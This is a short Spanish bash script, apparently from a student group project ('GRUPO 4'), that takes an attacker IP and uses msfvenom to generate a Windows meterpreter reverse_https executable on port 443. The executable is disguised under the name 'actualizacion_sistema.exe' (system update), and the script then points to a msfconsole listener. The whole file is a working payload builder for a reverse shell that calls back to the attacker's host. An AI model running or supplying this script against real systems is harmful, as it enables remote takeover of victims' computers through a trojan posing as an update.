#!/bin/bash

echo "========================================"
echo "  GRUPO 4 - Generador de Payload"
echo "========================================"
echo ""
echo "Tu IP actual en la red:"
ip a | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d/ -f1
echo ""
echo "Escribe la IP que usará el payload (LHOST):"
read IP_ATACANTE

if [ -z "$IP_ATACANTE" ]; then
    echo "No ingresaste una IP. Saliendo."
    exit 1
fi

echo ""
echo "Generando payload para $IP_ATACANTE en puerto 443..."
echo ""

msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=$IP_ATACANTE \
    LPORT=443 \
    -f exe \
    -o /home/kali/proyecto-grupo4/actualizacion_sistema.exe

echo ""
echo "========================================"
echo "  Payload generado exitosamente"
echo "========================================"
echo ""
echo "Archivo: /home/kali/proyecto-grupo4/actualizacion_sistema.exe"
echo ""
echo "Siguiente paso: inicia el listener con este comando:"
echo ""
echo "  msfconsole -r /home/kali/proyecto-grupo4/listener.rc"
echo ""
